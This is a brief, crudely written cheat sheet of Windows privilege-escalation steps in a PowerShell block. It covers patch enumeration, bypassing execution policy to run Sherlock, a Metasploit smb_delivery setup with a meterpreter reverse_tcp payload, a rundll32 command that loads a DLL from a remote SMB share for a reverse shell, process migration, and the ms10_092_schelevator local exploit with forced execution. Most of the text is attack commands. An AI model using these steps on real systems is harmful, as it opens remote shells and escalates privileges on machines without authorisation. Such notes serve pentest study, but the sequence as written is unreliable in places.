

TLDR;


Checking current patch level


```powershell
// ----------------------- Patch enumeration --------------------- //
wmic qfe


// Lets run sherlock
Set-ExecutionPolicy bypass -Scope process

// Importing sherlock
Import-Module .\Sherlock.ps1

Find-AllVulns

// ----------------------- Metasploit cancer --------------------- //
// Setup SMB_Delivery because it makes life sooo much easier
search smb_delivery

// setting the payload
set payload windows/meterpreter/reverse_tcp

// Set it as a DLL
set target 0

// exploit so it can give you back the command you need to run on the piece of shit legacy system and get a revshell
rundll32.exe \\0.0.0.0\rJTI\test.dll,0


// migrating from 32 bit to 64 bit so the exploit can work bro this is actual cancer, mnake sure to check what it supports

getid

ps

migrate


// then just use the one you want, also just incase always do forceexploit true because itll show its not vulnerable but it actually is LOL

use exploit/windows/local/ms10_092_schelevator


```